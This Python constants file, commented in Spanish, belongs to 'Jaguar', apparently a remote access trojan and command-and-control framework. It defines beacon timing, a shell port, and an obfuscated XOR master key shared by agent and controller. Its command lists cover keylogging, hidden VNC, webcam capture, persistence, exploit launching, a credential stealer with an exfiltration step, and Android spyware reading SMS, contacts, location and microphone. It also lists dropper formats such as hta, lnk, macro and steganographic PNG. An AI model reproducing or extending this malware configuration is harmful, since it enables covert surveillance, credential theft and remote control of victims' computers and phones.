# -*- coding: utf-8 -*-
"""Constantes globales de Jaguar.

Regla sagrada: `_K_OBF` y `CLAVE_XOR_DEFECTO` NO se tocan. Agente y controlador
derivan de aquí la misma clave maestra; cambiarlas rompe el protocolo byte a
byte (el handshake dejaría de validar el HMAC).

Aquí solo hay constantes y listas de clasificación. Nada de imports pesados.
"""

APP_NAME = "Jaguar"
APP_VERSION = "2.1.0"

# ---------------------------------------------------------------------------
# Red
# ---------------------------------------------------------------------------
HOST_DEFECTO = "0.0.0.0"
PUERTO_DEFECTO = 8000
PUERTO_SHELLS = 4444
PUERTO_HTTP_DEFECTO = 8080
TIMEOUT_SOCKET = 30.0
INTERVALO_LATIDO = 10.0
BEACON_SLEEP_DEFECTO = 5.0
BEACON_JITTER_DEFECTO = 20

# ---------------------------------------------------------------------------
# Cifrado (NO TOCAR)
# ---------------------------------------------------------------------------
TAM_LONGITUD = 4
_K_OBF = bytes([
    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
])
CLAVE_XOR_DEFECTO = bytes(b ^ 0x5A for b in _K_OBF)

# ---------------------------------------------------------------------------
# Tipos de mensaje
# ---------------------------------------------------------------------------
MSG_HOLA = "hola"
MSG_REGISTRO = "registro"
MSG_LATIDO = "latido"
MSG_COMANDO = "comando"
MSG_RESPUESTA = "respuesta"
MSG_EVENTO = "evento"          # <- push (hvnc_frame / escritorio_frame)
MSG_DESCONEXION = "desconexion"
MSG_BEACON_CONFIG = "beacon"
MSG_BEACON_CONFIG_ALT = "beacon_config"
MSG_CHUNK = "chunk"

# ---------------------------------------------------------------------------
# Categorías de comando
# ---------------------------------------------------------------------------
CMD_SYSINFO = "sysinfo"
CMD_PROCESOS = "procesos"
CMD_SHELL = "shell"
CMD_LISTAR_DIR = "listar_dir"
CMD_DESCARGAR = "descargar"
CMD_DESCARGAR_ARCHIVO = "descargar_archivo"
CMD_SUBIR = "subir_archivo"
CMD_SUBIR_EJECUTAR = "subir_ejecutar"
CMD_CAPTURA = "captura"
CMD_MENSAJE = "mensaje"
CMD_ABRIR_URL = "abrir_url"
CMD_ENERGIA = "energia"
CMD_PERSISTIR = "persistir"
CMD_DESCONECTAR = "desconectar"
CMD_WEBCAM = "webcam"
CMD_KEYLOGGER = "keylogger"
CMD_HVNC_INICIAR = "hvnc_iniciar"
CMD_HVNC_DETENER = "hvnc_detener"
CMD_HVNC_STREAM = "hvnc_stream"
CMD_CAPTURA_STREAM = "captura_stream"
CMD_RED_ESCANEAR = "red_escanear"
CMD_SUGERIR_EXPLOIT = "sugerir_exploit"
CMD_LANZAR_EXPLOIT = "lanzar_exploit"
CMD_PRIVILEGIOS = "privilegios"
CMD_SPAWN = "spawn"
CMD_WIFI_PERFILES = "wifi_perfiles"
CMD_PORTSCAN = "portscan"
CMD_CAPS = "caps"

# Stealer (estilo PureLogs)
CMD_STEALER_RECOLECTAR = "stealer_recolectar"
CMD_STEALER_ESTADO = "stealer_estado"
CMD_STEALER_PAQUETE = "stealer_paquete"
CMD_STEALER_EXFIL = "stealer_exfil"
CMD_STEALER_AUTO = "stealer_auto"

# ---------------------------------------------------------------------------
# Clasificación de comandos
# ---------------------------------------------------------------------------
# Recon del cliente: su salida va al panel de Beacons, no al log genérico.
CMDS_RECON = (
    "powershell", "whoami", "netstat", "arp", "ipconfig", "tasklist",
    "net_user", "net_view", "schtasks_list", "drives", "env", "wmi",
    "spawn", "portscan", "recon_full",
)

# Comandos de alto volumen: se envían sin ensuciar el log (ruido de fondo).
CMDS_SILENCIOSOS = (
    "ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado",
    "hvnc_captura", "hvnc_stream", "captura_stream", "webcam_frame",
    "captura", "hvnc_estado", "stealer_estado", "movil_pantalla",
)

# Comandos que no esperan respuesta con datos (solo confirmación).
CMDS_SIN_DATOS = (
    "hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar", "hvnc_stream",
    "captura_stream", "webcam_iniciar", "webcam_parar", "hvnc_opciones",
    "bloquear_entrada", "persistir", "proxy_iniciar", "proxy_parar",
    "swap_raton", "clip_set", "abrir_url", "mensaje", "subir_ejecutar",
    "keylogger_iniciar",
)

# Prefijo del módulo móvil. Se enruta ANTES del log genérico (RF12).
PREFIJO_MOVIL = "movil_"
CMDS_MOVIL = (
    "movil_info", "movil_pantalla", "movil_pantalla_off", "movil_tap",
    "movil_swipe", "movil_texto", "movil_tecla", "movil_camara", "movil_mic",
    "movil_sms", "movil_sms_enviar", "movil_contactos", "movil_llamadas",
    "movil_ubicacion", "movil_sensores", "movil_bateria",
    "movil_almacenamiento", "movil_wifi", "movil_wifi_scan",
    "movil_telefonia", "movil_procesos", "movil_cuentas",
    "movil_notif_list", "movil_clip_get", "movil_clip_set",
    "movil_notificar", "movil_toast", "movil_tts", "movil_vibrar",
    "movil_linterna", "movil_fondo", "movil_huella", "movil_dialogo",
    "movil_media", "movil_volumen", "movil_apps", "movil_app_abrir",
    "movil_app_matar", "movil_root", "movil_persistir",
)

# ---------------------------------------------------------------------------
# Plataformas y capacidades (para filtrar el menú contextual por SO, RF11)
# ---------------------------------------------------------------------------
PLATAFORMA_WINDOWS = "windows"
PLATAFORMA_LINUX = "linux"
PLATAFORMA_MACOS = "macos"
PLATAFORMA_ANDROID = "android"

PLATAFORMAS = (PLATAFORMA_WINDOWS, PLATAFORMA_LINUX, PLATAFORMA_MACOS,
               PLATAFORMA_ANDROID)

# Orden de presentación del filtro por SO en el árbol de clientes (RF10).
ORDEN_SO = {PLATAFORMA_WINDOWS: 0, PLATAFORMA_LINUX: 1, PLATAFORMA_MACOS: 2,
            PLATAFORMA_ANDROID: 3}

# Etiquetas legibles para el combo de filtro.
ETIQUETA_SO = {
    PLATAFORMA_WINDOWS: "Windows",
    PLATAFORMA_LINUX: "Linux",
    PLATAFORMA_MACOS: "macOS",
    PLATAFORMA_ANDROID: "Android",
}

# Capacidades que el menú contextual consulta en info["caps"] antes de mostrar
# una entrada. Si la clave falta o es False, la acción no se ofrece.
CAPS_REQUERIDAS = (
    "shell", "captura", "stream", "hvnc", "webcam", "keylogger", "raton",
    "teclado", "portapapeles", "persistencia", "energia", "mensaje",
    "abrir_url", "archivos", "descarga", "proxy", "bloquear", "wifi",
    "privilegios", "stealer_navegadores", "movil",
)

# ---------------------------------------------------------------------------
# Riesgos (ordenación de recomendaciones de exploits)
# ---------------------------------------------------------------------------
RIESGO_CRITICO = "Crítico"
RIESGO_ALTO = "Alto"
RIESGO_MEDIO = "Medio"
RIESGO_BAJO = "Bajo"
ORDEN_RIESGO = {RIESGO_CRITICO: 0, RIESGO_ALTO: 1, RIESGO_MEDIO: 2,
                RIESGO_BAJO: 3}

# ---------------------------------------------------------------------------
# Builder: formatos que el constructor sabe generar DE VERDAD.
# Debe reflejar constructor.generar_todo(); si añades un generador allí,
# añádelo aquí o la GUI no lo ofrecerá.
# ---------------------------------------------------------------------------
FORMATOS_PAYLOAD = ["py", "sh", "exe", "desktop", "command", "android",
                    "bat", "vbs", "ps1", "lnk", "hta", "pdf", "png",
                    "png_stego", "macro"]

# Formatos que solo tienen sentido en Windows.
FORMATOS_WINDOWS = ["exe", "bat", "vbs", "ps1", "lnk", "hta", "pdf", "png",
                    "png_stego", "macro"]

# ---------------------------------------------------------------------------
# Interfaz
# ---------------------------------------------------------------------------
COLS_CLIENTES = ["", "ID", "Host", "Usuario", "SO", "Arq.", "IP", "País",
                 "ISP", "Lat."]
TAB_WIFI = "  📡 Wi-Fi  "